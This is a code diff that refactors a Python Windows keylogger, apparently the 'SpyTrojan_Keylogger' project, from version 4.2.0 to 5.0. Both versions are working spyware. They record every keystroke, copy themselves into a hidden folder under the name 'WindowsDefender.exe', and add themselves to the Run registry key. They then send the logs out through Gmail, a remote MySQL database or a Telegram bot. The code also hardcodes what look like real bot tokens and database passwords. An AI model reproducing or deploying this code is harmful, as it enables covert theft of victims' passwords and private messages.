@@ -10,61 +10,304 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.2.0
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v5.0
 
-# Librerías Utilizadas
+#region import Libs
 from pynput.keyboard import Listener
-from getpass import getuser # Obtiene el nombre del usuario
-from datetime import datetime
-from winreg import *
-import datetime
-import random
-import os
-import telebot
-import yagmail
-import pymysql  # Lib connection mysql
-import shutil
-import string
-import time
-import threading # Hilos
-import socket    # Librería verifica internet
+from getpass import getuser     # Obtiene el nombre del usuario
+from datetime import datetime   # Devuelve fecha y hora actual
+from winreg import *            # Modifica registros de Windows
+import datetime                 # Devuelve fecha y hora actual
+import random                   # Genera numeros
+import os                       # Lib para copiar archivos
+import telebot                  # Telegram API
+import yagmail                  # Enviar archivos solo a Gmail
+import pymysql                  # Lib connection mysql
+import shutil                   # Lib para crear carpetas
+import string                   # Lib genera textos
+import time                     # Contar segundos
+import threading                # Hilos
+import socket                   # Librería verifica internet
+#endregion
 
-def addStartup():  # function =  Iniciar automaticamente
-    path = GetPathOcult()+ GetNameKey() # Path del Software completo
-    name = "Windows Defender Key"                                                   # Nombre del StartUp     // Solo se ve en el registro *Regedit*
-    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
-    def verificar():
-        try:  # Intenta crear la dirección
-            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')                   # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
-            return True # Se creó la carpeta
+class Config:
+    def __init__(self):
+        self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
+        self.NAME_STARTUP = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
+        self.PATH_OCULT = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"    # Ruta donde se esconderá el KEYLOGGER
+        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings"+ "\\"           # Ruta del Registro de teclas
+        self.LOG_NAME = "reg" + "." + "k"
+        self.PATH_KEY = self.PATH_OCULT + self.NAME_KEY  # <No cambiar>
+        self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME
+                                                # Nombre y extensión del registro
+        # Importante
+        self.TIMESEND = 5 #[minutos]                                                # Tiempo de envió del registro
+        self.MODE = 2     # 0 = Gmail
+                          # 1 = DataBase                                            # Solo se puede usar una opción
+                          # 2 = TelegramBot
+    class DataBase:  # Clase de Base de datos
+        def __init__(self):
+            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
+            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
+            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
+            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
+            self.PORT     = "3306"                                                  # Port
+    class Gmail:
+        def __init__(self):
+            self.GMAIL_1 = "correo1@gmail.com"
+            self.PASS_1  = "password1"
+            self.GMAIL_2 = "correo2@gmail.com"
+            self.PASS_2  = "password2"
+            self.GMAIL_3 = "correo3@gmail.com"
+            self.PASS_3  = "password3"
+          # Solo un correo Recibirá el Registro de Teclas
+            self.RECEIVERS = ["receivers1@yahoo.com"]
+          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
+          # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
+    class TelegramBot:
+        def __init__(self):
+            self.ID   = 831756903                                                     # ID Principal [Obligatorio]
+            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
+            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
+            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
+
+
+class Functions:
+    def CheckFolder_StartUP(self):  # Función especial para el startUp
+        try:    # Intenta crear la dirección
+            os.makedirs("C:\\Users\\Public\\Security\\Microsoft")   # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
+            return True     # Se creó la carpeta
         except:
-            return False# La carpeta ya existe
-    try:    # Solo si tiene permisos de administrador
-        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
-        SetValueEx(registry, name, 0, REG_SZ, path)
-        verificar() # Crea Carpeta
-    except: # Si no tiene permisos de administrador
-        if (verificar()):
-            registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
-            SetValueEx(registry,name, 0, REG_SZ, path)
-# Cópia él Keylogger a la carpeta oculta 
-def EscondeKey():
-    CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
-    try:
-        with open(FilePath(), 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
-            print("El keylogger ya se encontraba oculta en la carpeta: \n["+FilePath()+"]")
-    except :
-        print("El Keylogger no se encuentra escondido...\nSe tratará de esconderlo...")
+            return False    # La carpeta ya existe
+        pass
+
+    def RandomChar(self,y=100):
+        return ''.join(random.choice(string.ascii_letters) for x in range(y))
+
+    # Función = Verifica si hay conexión a internet para poder envíar el log
+    def VerifyConnection(self):
+        con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
+        try:                                                            # Intenta conectarse al servidor de Google
+            con.connect(('www.google.com', 80))
+            con.close()
+            print("[Test Internet] => [OK]")
+            return True
+        except:
+            print("[Test Internet] => [NO]")
+            return False
+
+    def SendGmail(self, file, email, password, receiver_email):
         try:
-            shutil.copy(GetNameKey() , FilePath()) # Intenta ocultar el keylogger en una carpeta
-            print("\nEl keylogger se escondió exitosamente en el sistema")
+            f = datetime.datetime.now()
+            subject = "Data User: " + str(getuser())
+            # Inicia Sesión
+            yag = yagmail.SMTP(user=email, password=password)
+            informacion = "\nFecha: " + f.strftime("%A") + " " + f.strftime("%d") + " de " + f.strftime(
+                "%B") + "\nHora: " + f.strftime("%I") + ":" + f.strftime("%M") + " " + f.strftime(
+                "%p") + " con " + f.strftime("%S") + " Segundos"
+            # Cuerpo del mensaje
+            contents = [
+                "Información:\n\nNombre de Usuario: " + str(getuser()) + informacion
+            ]
+            yag.send(receiver_email, subject, contents, attachments=file)
+            print("[SendGmail] ["+email+"] Se envió el Registro de teclas correctamente")
+            return True
         except:
-            print("\nHubo un problema al esconder el El keylogger")
+            print("[SendGmail] ["+email+"] No se pudo envíar el Registro de teclas")
+            return False
 
-# Obtiene registro de teclas y guarda en un archivo reg.k
-def KeyLogger():
+    def RamdomLogNamePATH(self):
+        return Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
+
+    def CurrentTime(self):
+        T = datetime.datetime.now()
+        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime("%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
+
+class Util:
+    def __init__(self): #Constructor?
+        pass
+
+    def CreateFolders(self):    # Crea el directorio oculto
+        try:  # Intenta crear la dirección
+            os.makedirs(Config().PATH_OCULT)
+            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_OCULT)
+        except:
+            print("[CreateFolders] - La carpeta ya existe: "+ Config().PATH_OCULT)
+        try:  # Intenta crear la dirección del registro de teclas..
+            os.makedirs(Config().LOG_KEY_PATH)
+            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_KEY)
+        except:
+            print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)
+
+    def RenameFileKey(self,name): # Renombre el archivo log, antes de ser envíado
+        try:
+            self.CreateFolders()  # Crea el directorios [Evita posibles errores]
+            # Copia el archivo
+            path = Config().LOG_KEY_PATH+ name
+            os.rename(Config().PATH_LOG, path)
+            print("El archivo reg.k se renombró correctamente")
+        except:
+            print("No se puedo renombrar el archivo 'reg.k' ")
+            pass
+
+    def addStartUp(self):
+        print("[StartUp] Iniciando Función")
+        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        try:    # Solo si tiene permisos de administrador
+            registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)  # machine
+            SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
+            Functions().CheckFolder_StartUP() # Crea carpeta
+            print("[StartUp] Exitoso Administrador")
+        except:
+            print("[StartUp] USER - Verificando existencia")
+            if Functions().CheckFolder_StartUP():
+                print("[StartUp] USER - No se encontró, creando...")
+                registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
+                SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
+                print("[StartUp] USER - EXITOSO")
+
+    def Trojan(self):   # Se Replica en el sistema
+        self.CreateFolders()
+        try:
+            with open(Config().PATH_KEY, 'r') as f:  # Verifica si el keylogger se encuentra oculto en el sistema
+                print("[Trojan] - Ya se encuentra en el sistema : \n" + Config().PATH_KEY)
+        except:
+            print("[Trojan] - No se encuentra en el sistema...\nProceso Troyano...")
+            try:
+                shutil.copy(Config().NAME_KEY, Config().PATH_KEY)  # Intenta ocultar el keylogger en una carpeta
+                print("\n[Trojan] - Se replico en el sistema correctamente")
+            except:
+                print("\n[Trojan] - Hubo un problema al replicar en el sistema")
+    # Envía los datos reg.k vía Gmail
+    def SendGmail(self):
+        # Crea nombre del archivo
+        nameFile = Functions().RamdomLogNamePATH()
+        # Renombra el archivo original
+        self.RenameFileKey(nameFile) # Cambia el archivo `reg.k` a  `user - 234bkhj4b23k4g23vj43.txt`
+
+        # Envía el archivo renombrado
+        self.CreateFolders()
+        homedir = Config().LOG_KEY_PATH + str(nameFile)
+        print("[Gmail send] Proceso de envío...")
+
+        if Functions().SendGmail(homedir, Config.Gmail().GMAIL_1, Config.Gmail().PASS_1, Config.Gmail().RECEIVERS):
+            os.remove(homedir)
+
+        elif Functions().SendGmail(homedir, Config.Gmail().GMAIL_2, Config.Gmail().PASS_2, Config.Gmail().RECEIVERS):
+            os.remove(homedir)
+
+        elif Functions().SendGmail(homedir, Config.Gmail().GMAIL_3, Config.Gmail().PASS_3, Config.Gmail().RECEIVERS):
+            os.remove(homedir)
+
+    def TelegramBot(self):
+        try:
+            print("[TelegramBot] Proceso...")
+            pathN = Functions().RamdomLogNamePATH()
+            os.rename(Config().PATH_LOG, pathN)
+            # Abre el archivo
+            f = open(pathN, 'r')
+            T = datetime.datetime.now()
+            currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
+                "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
+            def SendT(ID):
+                bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
+                bot.send_message(ID,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
+                print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID] =" + str(ID))
+            try:
+                if Config.TelegramBot().ID_2 != 000000000:
+                    SendT(Config.TelegramBot().ID)
+
+                if Config.TelegramBot().ID_2 != 000000000:
+                    SendT(Config.TelegramBot().ID_2)
+
+                if Config.TelegramBot().ID_3 != 000000000:
+                    SendT(Config.TelegramBot().ID_3)
+
+                f.close()
+                os.remove(pathN)
+                print("[TelegramBot] Se eliminó el archivo caché correctamente")
+            except:
+                print("[Telegram] Error al subir el registro")
+        except:
+            try:
+                f.close()
+                os.remove(pathN)  # Borra la carpeta por posible Errores
+            except:
+                pass
+            print("[Telegram] No se encuentra el archivo")
+
+    def MySQL(self):
+        exito = False
+        try:  # Verifica si se inició corectamente
+            connection = pymysql.connect(
+                host=Config().DataBase().HOSTNAME,
+                user=Config().DataBase().USERNAME,
+                password=Config().DataBase().PASSWORD,
+                database=Config().DataBase().DATABASE)
+            cursor = connection.cursor()  # Objeto cursor
+            print("Se inició correctamente ")
+            exito = True
+        except:
+            exito = False
+            print("Error al iniciar sesión [DataBase]")
+
+        def UpdateUser():
+            try:
+                pathN = Functions().RamdomLogNamePATH()
+                os.rename(Config().PATH_LOG, pathN)
+                # Abre el archivo
+                f = open(pathN, 'r')
+                data = f.read()
+                f.close()
+                print(data)
+                # Tiempo
+                T = datetime.datetime.now()
+                currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
+                    "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
+                sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)"
+                try:
+                    cursor.execute(sql, (str(getuser()), currentTime, data))  # Ejecuta virtual
+                    connection.commit()  # Se guardan virtual
+                    print("[Database] Se subieron los datos correctamente")
+                    # Elimina Registro Key
+                    connection.close()
+                    os.remove(pathN)
+                except:
+                    print("[Database] Error al subir los datos")
+
+            except:
+                try:
+                    os.remove(pathN)  # Borra la carpeta por posible Errores
+                except:
+                    pass
+                print("[DataBase] No se encuentra el archivo")
+
+        if (exito):  # Solo se ejecutará si se inició correctamente la base de datos
+            print("[DataBase]=> " + str(exito))
+            UpdateUser()
+
+class Send:
+    def __init__(self):
+        pass
+    def SendLog(self):
+        while(True):
+            #time.sleep(Config().TIMESEND * 60)  # Tiempo de espera por minutos
+            time.sleep(4) # Solo antigueeo
+            if Functions().VerifyConnection():
+                if Config().MODE == 0:
+                    Util().SendGmail()
+                if Config().MODE == 1:
+                    Util().MySQL()
+                if Config().MODE == 2:
+                    Util().TelegramBot()
+
+
+
+class Keylogger:
+    def __init__(self):
+        pass
     # Convierte tecla a un valor legible
-    def KeyConMin(argument):                # Caracteres Comunes // Optimizados
+    def KeyConMin(self, numberKey):                # Caracteres Comunes // Optimizados
         switcher = {
             # Vocales Minisculas
             "'a'": "a",
@@ -164,358 +407,104 @@ def KeyLogger():
             "'%'": "%",                     # %
             "'&'": "&",                     # &
             "'>'": ">",                     #
-            "'<'": "<",                     # 
+            "'<'": "<",                     #
             "'/'": "/",                     # /
             "'¿'": "¿",                     # ¿
             "'¡'": "¡",                     # ¡
             "'~'": "~"                      #
         }
-        return switcher.get(argument, "")
+        return switcher.get(numberKey, "")
 
     # Convierte tecla a un valor legible
-    def KeyConMax(argument):                # Botones, comunes // Optimizados
+    def KeyConMax(self, numberKey):  # Botones, comunes // Optimizados
         switcher = {
-            "Key.space": " ",               # Espacio
-            "Key.backspace": "«",           # Borrar
-            "Key.enter": "\n",            # Salto de linea
-            "Key.tab": "    ",              # Tabulación
-            "Key.delete":" «×» ",           # Suprimir
+            "Key.space": " ",  # Espacio
+            "Key.backspace": "«",  # Borrar
+            "Key.enter": "\n",  # Salto de linea
+            "Key.tab": "    ",  # Tabulación
+            "Key.delete": " «×» ",  # Suprimir
             # Números
-            "<96>": "0",                 # 0
-            "<97>": "1",                 # 1
-            "<98>": "2",                 # 2
-            "<99>": "3",                 # 3
-            "<100>": "4",                # 4
-            "<101>": "5",                # 5
-            "<102>": "6",                # 6
-            "<103>": "7",                # 7
-            "<104>": "8",                # 8
-            "<105>": "9",                # 9
+            "<96>": "0",  # 0
+            "<97>": "1",  # 1
+            "<98>": "2",  # 2
+            "<99>": "3",  # 3
+            "<100>": "4",  # 4
+            "<101>": "5",  # 5
+            "<102>": "6",  # 6
+            "<103>": "7",  # 7
+            "<104>": "8",  # 8
+            "<105>": "9",  # 9
             # Números Númeral
-            "None<96>": "0",                 # 0
-            "None<97>": "1",                 # 1
-            "None<98>": "2",                 # 2
-            "None<99>": "3",                 # 3
-            "None<100>": "4",                # 4
-            "None<101>": "5",                # 5
-            "None<102>": "6",                # 6
-            "None<103>": "7",                # 7
-            "None<104>": "8",                # 8
-            "None<105>": "9",                # 9
-            # Teclas raras 2 
+            "None<96>": "0",  # 0
+            "None<97>": "1",  # 1
+            "None<98>": "2",  # 2
+            "None<99>": "3",  # 3
+            "None<100>": "4",  # 4
+            "None<101>": "5",  # 5
+            "None<102>": "6",  # 6
+            "None<103>": "7",  # 7
+            "None<104>": "8",  # 8
+            "None<105>": "9",  # 9
+            # Teclas raras 2
             "['^']": "^",
-            "['`']": "`",                     #
-            "['¨']": "¨",                     #
-            "['´']": "´",                     #
-            "<110>": ".",                     #
-            "None<110>": ".",                 #
-            "Key.alt_l": " [AltL] ",         #
+            "['`']": "`",  #
+            "['¨']": "¨",  #
+            "['´']": "´",  #
+            "<110>": ".",  #
+            "None<110>": ".",  #
+            "Key.alt_l": " [AltL] ",  #
             "Key.alt_r": " [AltR] ",
             "Key.shift_r": " [ShiftR] ",
-            "Key.shift":   " [ShiftL] ",
-            "Key.ctrl_r": " [CtrlR] ",    #
-            "Key.ctrl_l": " [CtrlL] ",    #
-            "Key.right" : " [Right] ",                 #
-            "Key.left"  : " [Left] ",                  #
-            "Key.up"    : " [Up]",                    #
-            "Key.down"  : " [Down] ",                  #
-            #"'\x16'"  : " [Pegó] ",
-            #"'\x18'"  : " [Cortar] ", 
-            #"'\x03'"  : " [Copiar] ", 
-            "Key.caps_lock"  : " [MayusLock] ",  
-            #"Key.media_previous"    : " ♫ ",     #
-            #"Key.media_next"        : " ♫→ ",         #
-            #"Key.media_play_pause"  : " ■ ♫ ■ ",#
-            "Key.cmd"               : " [W] "          #
+            "Key.shift": " [ShiftL] ",
+            "Key.ctrl_r": " [CtrlR] ",  #
+            "Key.ctrl_l": " [CtrlL] ",  #
+            "Key.right": " [Right] ",  #
+            "Key.left": " [Left] ",  #
+            "Key.up": " [Up]",  #
+            "Key.down": " [Down] ",  #
+            # "'\x16'"  : " [Pegó] ",
+            # "'\x18'"  : " [Cortar] ",
+            # "'\x03'"  : " [Copiar] ",
+            "Key.caps_lock": " [MayusLock] ",
+            # "Key.media_previous"    : " ♫ ",     #
+            # "Key.media_next"        : " ♫→ ",         #
+            # "Key.media_play_pause"  : " ■ ♫ ■ ",#
+            "Key.cmd": " [W] "  #
         }
-        return switcher.get(argument, "")
+        return switcher.get(numberKey, "")
 
-    try:        # Intenta crear el archivo
-        log = os.environ.get('pylogger_file', os.path.expanduser(logKeyPath()+LogName()) )
-        #T = datetime.datetime.now()
-        #getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"
+    def GetKeys(self):
+        try:  # Intenta crear el archivo
+            log = os.environ.get('pylogger_file', os.path.expanduser(Config().PATH_LOG))
+            with open(log, "a") as f:
+                f.write(
+                    "")  # \n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
+        except:  # Si no puede crear el archivo, crea el directorio faltante
+            Util().CreateFolders()  # Function: Crea el directorio Ejemplo: ==> C:\Users\Public\Security\Windows Defender
 
-        with open (log, "a") as f:
-            f.write("")#\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
-    except: # Si no puede crear el archivo, crea el directorio faltante
-        CreateDir()  # Function: Crea el directorio Ejemplo: ==> C:\Users\Public\Security\Windows Defender
-    
-    def on_press(key):
-        with open(log, "a") as f:
-            #print(str(key)) <= habilitar Solo antiDebug
-            if (len(str(key))) <= 3:
-                print("Se oprimio la tecla: "+KeyConMin(str(key))) 
-                f.write(KeyConMin(str(key)))
-            else:
-                print("Se oprimio la tecla: "+KeyConMax(str(key)))
-                f.write(KeyConMax(str(key)))
+        def on_press(key):
+            with open(log, "a") as f:
+                # print(str(key)) <= habilitar Solo antiDebug
+                if (len(str(key))) <= 3:
+                    print("Se oprimio la tecla: " + self.KeyConMin(str(key)))
+                    f.write(self.KeyConMin(str(key)))
+                else:
+                    print("Se oprimio la tecla: " + self.KeyConMax(str(key)) )
+                    f.write(self.KeyConMax(str(key)))
 
-    with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
-        listener.join() 
+        with Listener(on_press=on_press) as listener:  # Escucha pulsaciones de teclas
+            listener.join()
 
-# Renombre el archivo log, antes de ser envíado
-def Rename(name):
-    try:
-        CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
-        # Copia el archivo 
-        pathO = logKeyPath()+ LogName()
-        pathN = logKeyPath()+ name
-        os.rename(pathO, pathN)
-        print("El archivo reg.k se renombró correctamente")
-    except:
-        print("No se puedo renombrar el archivo 'reg.k' ")
-        pass
-
-# Crea el directorio oculto 
-def CreateDir():
-    try:  # Intenta crear la dirección
-        os.makedirs(GetPathOcult())
-    except :
-        pass
-    try:  # Intenta crear la dirección del registro de teclas..
-        os.makedirs(logKeyPath())
-    except :
-        pass
-
-# Intervalo de tiempo que se enviará el archivo reg.k
-def SendLog():
-    def random_char(y=5):
-           return ''.join(random.choice(string.ascii_letters) for x in range(y))
-
-    
-    # Envía los datos reg.k vía Gmail 
-    def SendGmail(log, sender_email, sender_password, receiver_email):
-        try:
-            mifecha                 = datetime.datetime.now()
-            subject                 = "Data User: "+ str(getuser()) 
-            # Inicia Sesión 
-            yag = yagmail.SMTP(user=sender_email, password=sender_password)
-            informacion = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
-            # Cuerpo del mensaje
-            contents = [ 
-                "Información:\n\nNombre de Usuario: "+ str(getuser()) + informacion
-            ]
-            yag.send(receiver_email, subject, contents, attachments=log )
-            print("[+] Se envió el Registro de teclas correctamente")
-            return True
-        except:
-            print("[-] No se pudo envíar el Registro de teclas")
-            return False
-
-    def SendDataBaseMySQL():
-        exito = False
-        try:    # Verifica si se inició corectamente
-            connection = pymysql.connect(
-            host= DB_HOST(), 
-            user = DB_USER(), 
-            password = DB_PASS(), 
-            database = DB_NAME())
-            cursor = connection.cursor()    # Objeto cursor
-            print("Se inició correctamente [DataBase]")
-            exito = True
-        except:
-            exito = False
-            print("Error al iniciar sesión [DataBase]")
-        def UpdateUser():
-            try:
-                pathO = logKeyPath()+ LogName()
-                pathN = logKeyPath()+ random_char(15)+".txt"
-                os.rename(pathO, pathN)
-                # Abre el archivo
-                f = open (pathN ,'r')
-                data = f.read()
-                f.close()
-                print(data)
-                # Tiempo
-                T = datetime.datetime.now()
-                currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-                sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)"
-                try:
-                    cursor.execute(sql,(str(getuser()),currentTime,data)) # Ejecuta virtual
-
-
-                    connection.commit() # Se guardan virtual 
-                    print("[Database] Se subieron los datos correctamente")
-                    # Elimina Registro Key
-                    connection.close()
-                    os.remove(pathN)
-                except:
-                    print("[Database] Error al subir los datos")
-            
-            except:
-                try:
-                    os.remove(pathN)  # Borra la carpeta por posible Errores
-                except:
-                    pass
-                print("[DataBase] No se encuentra el archivo")
-            
-
-        if (exito): # Solo se ejecutará si se inició correctamente la base de datos
-            UpdateUser()
-        #print("[DataBase]=> "+str(exito))
-    def TelegramBot():
-        try:
-            print("[TelegramBot] Proceso...")
-            pathO = logKeyPath()+ LogName()
-            pathN = logKeyPath()+ random_char(20)+".txt"
-            os.rename(pathO, pathN)
-            # Abre el archivo
-            f = open (pathN ,'r')
-            T = datetime.datetime.now()
-            currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-            try:
-                bot = telebot.TeleBot(Token())      # Instancia
-                bot.send_message(ID(),"Usuario: "+str(getuser())+"\nFecha: "+currentTime+"\nRegistro de teclas:")  
-                bot.send_message(ID(),f.read())   #
-                print("[TelegramBot] Se obtuvo el registro de teclas y se subió a Telegram")
-                f.close()
-                os.remove(pathN)
-                print("[TelegramBot] Se eliminó el archivo caché correctamente")
-            except:
-                print("[Telegram] Error al subir los datos")
-        except:
-            try:
-                f.close()
-                os.remove(pathN)  # Borra la carpeta por posible Errores
-            except:
-                pass
-            print("[Telegram] No se encuentra el archivo")
-    
-    while (True):
-        time.sleep(timeSend()*60) # Tiempo de espera por minutos 
-        #time.sleep(4) # Solo antigueeo 
-        if VerificarConexion():
-            if (SendMode() == 0):    # Send Gmail
-
-                # Crea nombre del archivo
-                nameFile = str(getuser())+"-"+random_char(8)+".txt"
-                #Renombra el archivo original
-                Rename(nameFile)    # Cambia el archivo `reg.k` a  `log2.txt`
-
-                #Envía el archivo renombrado
-                CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
-                homedir = logKeyPath()+str(nameFile)
-
-                print("[Gmail send] Proceso de envío...")
-
-                if SendGmail(homedir, emailP(), passP() , ReceiveE()):    # Envía con el primer correo
-                    #Si se envíó correctamente, pues elimina el archivo
-                    os.remove(homedir)
-                elif SendGmail(homedir, emailS(), passS() , ReceiveE()):  # Envía con el segundo correo 
-                    os.remove(homedir)
-
-            if (SendMode() == 1):    # Send Data Base
-                SendDataBaseMySQL()
-
-            if (SendMode() == 2):    # Send Telegram
-                TelegramBot()
-        else:
-            print("[Send] sin conexión")
-
-
-# ***************************************   ZONA CUSTOM AVANZADA  ***********************************
-
-# NOTA:| Solo Cambie éstas variables si sabe      |
-#      | lo que está haciendo, en caso contrario  |
-#      | el Keylogger no funcionará correctamente |
-
-def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
-    return "WindowsDefender.exe"    # este archivo debe tener el mismo nombre "WindowsDefender.py"  
-def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger
-    return "C:\\Users\\Public\\Security\\Windows Defender\\"
-def logKeyPath():   # Ruta del registro de teclas.
-    # Ruta donde se guardará temporalmente el Registro de teclas
-    return "C:\\Users\\Public\\Security\\Settings\\"
-def LogName():  # Es el nombre que tendrá el registro de teclas.
-    return "reg.k"             # <= Opcional, cambie de nombre al archivo 
-def FilePath():
-    return GetPathOcult()+GetNameKey()  # <No cambiar>
-
-# ************************************  FIN ZONA CUSTOM AVANZADA   *********************************
-
-
-
-# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
-# ************ Zona Gmail ************* 
-def emailP():# Correo de envío [Primaria]                    
-    return "correo1@gmail.com"  # <<== Cambia éste correo
-def passP():                    # <<== Contraseña del correo
-    return "contra1"
-def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-    return "correo2@gmail.com"  # <<== Cambia éste correo
-def passS():                   
-    return "pass2"              # <<== Contraseña del correo 
-
-def ReceiveE():#Correos que recibirán el registro de teclas.
-    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
-# ************ End Zona Gmail ************* 
-
-# ************ Start Zone DATABASE ************* 
-# Nota: los datos de la base de datos son reales y publicas, solo para pruebas. 
-def DB_HOST():
-    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
-def DB_USER():
-    return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
-def DB_PASS():
-    return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
-def DB_NAME():
-    return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
-def DB_PORT(): 
-    return "3306"                                                   # Opcional en algunos casos
-
-# ************ End Zone DATABASE ************* 
-def SendMode():
-    return 2    # 0 = Gmail
-                # 1 = DataBase              # Solo se puede usar una opción
-                # 2 = TelegramBot
-                
-                
-
-
-def timeSend(): # Tiempo de envío perzonalizado
-    return 5 #Minutos                 <= Escoja su tiempo en minutos
-
-# ************ Zone Telegram *************     
-def ID():
-    return 831756903            # <=  ID de chat telegram [Nota] no lo coloque entre comillas
-
-def Token():
-    return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram
-
-# ************ Zona Telegram ************* 
-
-# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
-
-
-
-
-
-
-
-
-# Inicio multihilo
 if __name__ == '__main__':
-    
-    EscondeKey()    # Se replica dentro de la computadora
-    addStartup()    # Modifica registro de arranque
-    p1 = threading.Thread(target=KeyLogger)   # Registra teclas
 
-    p2 = threading.Thread(target=SendLog)   # Enviar Registro
+    print("[Keylogger] start...")
+    print("[Keylogger] Listening to Keys...")
+
+    Util().Trojan()
+    Util().addStartUp()
+
+    p1 = threading.Thread(target=Keylogger().GetKeys())  # Registra teclas
+    p2 = threading.Thread(target=Send().SendLog())  # Enviar Registro
     p2.start()
     p1.start()
     p1.join()
-
-
-
-#################################################################
-#                                                               #
-#                 Developed by SebastianEPH                     #
-#                                                   v4.1.0      #
-#################################################################
-# NOTAS IMPORTANTES:
-#
-# *** Éste script fue creado solo con fines educativos, por ese detalle el script está documentado, no me hago responsabe por un posible mal uso de éste script***
-#
-# Lea la documentación antes de usar: https://github.com/SebastianEPH/SpyTrojan_Keylogger
-
